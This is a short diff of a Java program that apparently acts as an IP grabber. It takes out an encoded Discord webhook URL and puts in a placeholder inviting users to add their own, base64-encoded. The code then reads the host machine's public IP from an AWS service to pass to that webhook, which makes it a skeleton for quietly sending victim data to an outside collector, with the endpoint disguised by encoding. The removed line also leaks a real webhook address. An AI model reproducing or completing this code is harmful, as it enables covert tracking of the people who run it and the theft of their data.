@@ -22,8 +22,8 @@ public class Main {
     public static void main(String args[]) throws Exception {
         //TODO: tidy up
 
-        // base64 encoded. very advanced security :^)
-        String url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTE0MTk0NzI3NjkwMTg2NzYyL1N6TkFsT25VZGZ4WGgyclBHSWpMTDNkM3NhRGlUVlMyeWRwTERzTjg4MWNVeDdySWJnUS0zZDNsMjFyQ1VpLVV2YmVK";
+        // base64 encoded. very advanced security :^) - https://www.base64decode.org/
+        String url = "add your webhook here (base64 encode first)";
         WebhookClient client = WebhookClient.withUrl(new String(Base64.getDecoder().decode(url.getBytes(StandardCharsets.UTF_8))));
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com").openStream()));
         String ip = bufferedReader.readLine();
